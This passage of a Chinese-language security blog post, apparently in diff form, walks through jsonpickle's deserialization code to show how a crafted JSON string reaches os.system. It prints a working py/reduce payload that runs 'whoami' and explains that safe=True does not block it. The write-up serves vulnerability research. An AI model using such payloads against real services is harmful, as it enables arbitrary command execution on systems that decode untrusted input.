+</span></span><span class="line"><span class="cl">			            <span class="c1"># 最后一个 backend 失败时抛出异常，否则继续尝试下一个</span>
+</span></span><span class="line"><span class="cl">			            <span class="k">if</span> <span class="n">idx</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_backend_names</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			                <span class="k">raise</span> <span class="n">e</span>
+</span></span><span class="line"><span class="cl">			            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			                <span class="k">pass</span>  <span class="c1"># 继续下一个解析器</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># 通过 context（Unpickler）恢复对象（可能涉及反序列化、自定义 class 映射等）</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">context</span><span class="o">.</span><span class="n">restore</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">reset</span><span class="o">=</span><span class="n">reset</span><span class="p">,</span> <span class="n">classes</span><span class="o">=</span><span class="n">classes</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>跟进 unpickler.py::restore() 方法，如果 reset 为 True，则对 _namedict、_namestack、_obj_to_idx、_objs、_proxies、_classes 等属性替换为空；<code>register_classes()</code> 方法功能是批量或单个注册类到内部 _classes 映射表中，都不影响运行</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">restore</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">,</span> <span class="n">reset</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">classes</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">reset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">reset</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">classes</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">register_classes</span><span class="p">(</span><span class="n">classes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">reset</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="bp">self</span><span class="o">.</span><span class="n">_swap_proxies</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">value</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>接着跟进  <code>_restore</code>，这是整段反序列化的关键部分。首先是传入的 obj 不属于字符串、列表、字典、集合、元组中任意一类，则直接返回结束程序；如果是，则调用 <code>unpickler.py::_restore_tags()</code>
+<figure>
+  <img src="file-20250807203703983.png" alt="" loading="lazy"></figure>
+
+<code>unpickler.py::_restore_tags()</code> 是对传入的标签进行处理，看下图，发现 targs 属性中存储着很多这种格式的标签 py/*。再看一下之前序列化出来的字符串 <code>{&quot;py/object&quot;: &quot;__main__.Person&quot;, &quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 30}</code>
+原来这就是 jsonpickle 内部特定的标签，序列化则是将标签与对应的类型匹配形成一个 JSON 字符串。那具体是什么作用，还得继续往下看代码
+<figure>
+  <img src="file-20250807204139449.png" alt="" loading="lazy"></figure>
+
+阅读 <code>_restore_tags()</code> 代码发现，当程序匹配到 obj 中存在某个特定标签时，就会把这个标签所指代的对象直接返回。此时回到 <code>_restore()</code>，restore 是等于刚刚拿到的对象，如 py/object 则就是 _restore_object 对象，再执行 restore(obj)，就会去执行这个 <code>_restore_{tags}</code> 类!</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_tags</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">tags</span><span class="o">.</span><span class="n">RESERVED</span> <span class="o">&lt;=</span> <span class="nb">set</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="nb">type</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span> <span class="ow">in</span> <span class="p">(</span><span class="nb">list</span><span class="p">,</span> <span class="nb">dict</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">def</span> <span class="nf">restore</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">x</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">restore</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">dict</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">tags</span><span class="o">.</span><span class="n">TUPLE</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_tuple</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">SET</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_set</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">B64</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_base64</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">B85</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_base85</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">ID</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_id</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">ITERATOR</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_iterator</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">OBJECT</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_object</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">TYPE</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_type</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">REDUCE</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_reduce</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">FUNCTION</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_function</span>
+</span></span><span class="line"><span class="cl">            <span class="k">elif</span> <span class="n">tags</span><span class="o">.</span><span class="n">REPR</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>  <span class="c1"># Backwards compatibility</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_repr</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_dict</span>
+</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">util</span><span class="o">.</span><span class="n">is_list</span><span class="p">(</span><span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">restore</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore_list</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">def</span> <span class="nf">restore</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">x</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">restore</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>所以标签的作用就是帮助标识序列化字典中的特殊数据结构或元信息，去调用指定的函数。
+继续看代码，此时走到 <code>_restore_object()</code> 函数内
+<figure>
+  <img src="file-20250807210408793.png" alt="" loading="lazy"></figure>
+
+第二行 loadclass() 方法：一个获取类的功能，它会执行 <code>__import__(module)</code>，导入指定类并获取导入的类，将其作为传参返回</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">cls = loadclass(class_name, classes=self._classes)
+</span></span><span class="line"><span class="cl">	  =&gt;
+</span></span><span class="line"><span class="cl">		def loadclass(module_and_name, classes=None):
+</span></span><span class="line"><span class="cl">			if classes:
+</span></span><span class="line"><span class="cl">				try:
+</span></span><span class="line"><span class="cl">					return classes[module_and_name]
+</span></span><span class="line"><span class="cl">				except KeyError:
+</span></span><span class="line"><span class="cl">					try:
+</span></span><span class="line"><span class="cl">						return classes[module_and_name.rsplit(&#39;.&#39;, 1)[-1]]
+</span></span><span class="line"><span class="cl">					except KeyError:
+</span></span><span class="line"><span class="cl">						pass
+</span></span><span class="line"><span class="cl">			names = module_and_name.split(&#39;.&#39;)
+</span></span><span class="line"><span class="cl">			for up_to in range(len(names) - 1, 0, -1):
+</span></span><span class="line"><span class="cl">				module = util.untranslate_module_name(&#39;.&#39;.join(names[:up_to]))
+</span></span><span class="line"><span class="cl">				try:
+</span></span><span class="line"><span class="cl">					__import__(module)
+</span></span><span class="line"><span class="cl">					obj = sys.modules[module]
+</span></span><span class="line"><span class="cl">					for class_name in names[up_to:]:
+</span></span><span class="line"><span class="cl">						try:
+</span></span><span class="line"><span class="cl">							obj = getattr(obj, class_name)
+</span></span><span class="line"><span class="cl">						except AttributeError:
+</span></span><span class="line"><span class="cl">							continue
+</span></span><span class="line"><span class="cl">					return obj
+</span></span><span class="line"><span class="cl">				except (AttributeError, ImportError, ValueError):
+</span></span><span class="line"><span class="cl">					continue
+</span></span><span class="line"><span class="cl">			return None</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>当脚本反序列化时，使用某个类作为 JSON 字符串的主体，如下面程序使用 Person() 类的实例化，但是在程序中却没有 class 定义该类</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jsonpickle</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">encoded_new</span> <span class="o">=</span> <span class="s1">&#39;{&#34;py/object&#34;: &#34;__main__.Person&#34;, &#34;name&#34;: {&#34;py/reduce&#34;: [{&#34;py/function&#34;: &#34;nt.system&#34;}, {&#34;py/tuple&#34;: [&#34;whoami&#34;]}]}, &#34;age&#34;: 30}&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">jsonpickle</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoded_new</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>那么程序就不会迭代去寻找内部的标签，而是在 unpickler.py_restore_object_instance() 735行抛出异常，缘由是程序会执行 <code>cls.__new__()</code> 实例化该类，却发现没有这个类
+<figure>
+  <img src="file-20250807214041700.png" alt="" loading="lazy"></figure>
+
+当补上该类后，cls.<strong>new</strong>() 就会正常实例化成功
+<figure>
+  <img src="file-20250807220123816.png" alt="" loading="lazy"></figure>
+
+最后走到 instance = self._restore_object_instance_variables(obj, instance)，跟进 _restore_object_instance_variables，再跟进 _restore_from_dict
+迭代来了，这里 for 循环依次取出 k,v 对应字典中的键值，第一次是 <code>&quot;py/object&quot;: &quot;__main__.Person&quot;</code>，当开头是标签时走进第一个 if，continue 直接跳过。
+然后 for 循环取出下一对，即  &ldquo;name&rdquo;: {&ldquo;py/reduce&rdquo;: [{&ldquo;py/function&rdquo;: &ldquo;nt.system&rdquo;}, {&ldquo;py/tuple&rdquo;: [&ldquo;whoami&rdquo;]}]}，键名为 &ldquo;name&rdquo;，不是 py/*  格式的标签名，一路走到 self_restore()
+<figure>
+  <img src="file-20250807220311347.png" alt="" loading="lazy"></figure>
+
+跟进去，就是把子键值对再跑一遍
+<figure>
+  <img src="file-20250807220810440.png" alt="" loading="lazy"></figure>
+
+此时标签为 py/reduce，走到 _restore_reduce 函数内部，460行 reduce_val 使用 map 迭代器去迭代 &lsquo;py/reduce&rsquo; 键对应的值，将其交给 _restore 对象，其实就是又进行一次上面的操作
+<figure>
+  <img src="file-20250807222457855.png" alt="" loading="lazy"></figure>
+
+这里快进一下，可以看看指定的标签对应的两个函数
+function 内容如其名，loadclass 上面已经分析过了，就是导入库获取导入的库并返回</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_function</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">loadclass</span><span class="p">(</span><span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">FUNCTION</span><span class="p">],</span> <span class="n">classes</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_classes</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>_restore_tuple 函数作用是将数据结构还原为 Python 的原生 <code>tuple</code> 对象，并递归还原其中的所有元素。</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_tuple</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">tuple</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">_restore</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">TUPLE</span><span class="p">]])</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>最后回到 <code>_restore_reduce，f, args, state, listitems, dictitems = reduce_val</code> 分别获取 reduce_val 列表中的值，然后走到 stage1 = <code>f(*args)</code>
+这里 f 为上面获取到 os.system() 类方法，<code>*args 为 ('whoami',)</code>，所以 f(*args) 实际上就是 import os;os.system(&lsquo;whoami&rsquo;,)，这样就达成命令执行了</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_reduce</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">proxy</span> <span class="o">=</span> <span class="n">_Proxy</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">_mkref</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">reduce_val</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_restore</span><span class="p">,</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">REDUCE</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">reduce_val</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">            <span class="n">reduce_val</span><span class="o">.</span><span class="n">extend</span><span class="p">([</span><span class="kc">None</span><span class="p">]</span> <span class="o">*</span> <span class="p">(</span><span class="mi">5</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">reduce_val</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span> <span class="n">listitems</span><span class="p">,</span> <span class="n">dictitems</span> <span class="o">=</span> <span class="n">reduce_val</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">f</span> <span class="o">==</span> <span class="n">tags</span><span class="o">.</span><span class="n">NEWOBJ</span> <span class="ow">or</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s1">&#39;__name__&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;__newobj__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stage1</span> <span class="o">=</span> <span class="n">f</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">state</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">AttributeError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">...</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">                    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250807162229439.png" alt="" loading="lazy"></figure>
+
+反序列化流程分析到这里就结束了，可以看到通过 <code>__reduce__()</code> 反序列化魔术方法配合 import os;os.system 可以做到命令执行
+至于 safe 模式，好像只有 _restore_repr() 方法有受到影响，开启 safe=True 时会 return None，loadrepr() 就不能被调用。reduce 之类的是不被管理的</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_repr</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">safe</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="c1"># eval() is not allowed in safe mode</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">        <span class="n">obj</span> <span class="o">=</span> <span class="n">loadrepr</span><span class="p">(</span><span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">REPR</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">		      <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">def</span> <span class="nf">loadrepr</span><span class="p">(</span><span class="n">reprstr</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">				    <span class="s2">&#34;&#34;&#34;Returns an instance of the object from the object&#39;s repr() string.
+</span></span></span><span class="line"><span class="cl"><span class="s2">				    It involves the dynamic specification of code.
+</span></span></span><span class="line"><span class="cl"><span class="s2">				
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &gt;&gt;&gt; 				obj = loadrepr(&#39;datetime/datetime.datetime.now()&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s2">    &gt;&gt;&gt; 				obj.__class__.__name__
+</span></span></span><span class="line"><span class="cl"><span class="s2">				    &#39;datetime&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s2">				
+</span></span></span><span class="line"><span class="cl"><span class="s2">				    &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">				    <span class="n">module</span><span class="p">,</span> <span class="n">evalstr</span> <span class="o">=</span> <span class="n">reprstr</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				    <span class="n">mylocals</span> <span class="o">=</span> <span class="nb">locals</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">				    <span class="n">localname</span> <span class="o">=</span> <span class="n">module</span>
+</span></span><span class="line"><span class="cl">				    <span class="k">if</span> <span class="s1">&#39;.&#39;</span> <span class="ow">in</span> <span class="n">localname</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				        <span class="n">localname</span> <span class="o">=</span> <span class="n">module</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">				    <span class="n">mylocals</span><span class="p">[</span><span class="n">localname</span><span class="p">]</span> <span class="o">=</span> <span class="nb">__import__</span><span class="p">(</span><span class="n">module</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				    <span class="k">return</span> <span class="nb">eval</span><span class="p">(</span><span class="n">evalstr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				    
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">_mkref</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>反序列化流程走完，知道 decode 基本上是怎么走的了，接下来就需要仔细看看标签，确定一下 Payload 能怎么写</p>
+<h2 class="heading-element" id="标签解析"><span>标签解析</span>
+  <a href="#%e6%a0%87%e7%ad%be%e8%a7%a3%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>py/reduce、py/function 上面流程分析已经看到了，就不再分析一遍，</p>
+<json-viewer value="&#34;{\&#34;py/reduce\&#34;: [{\&#34;py/function\&#34;: \&#34;nt.system\&#34;}, {\&#34;py/tuple\&#34;: [\&#34;whoami\&#34;]}]}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><h3 class="heading-element" id="pyobject-标签"><span><code>py/object</code> 标签</span>
+  <a href="#pyobject-%e6%a0%87%e7%ad%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
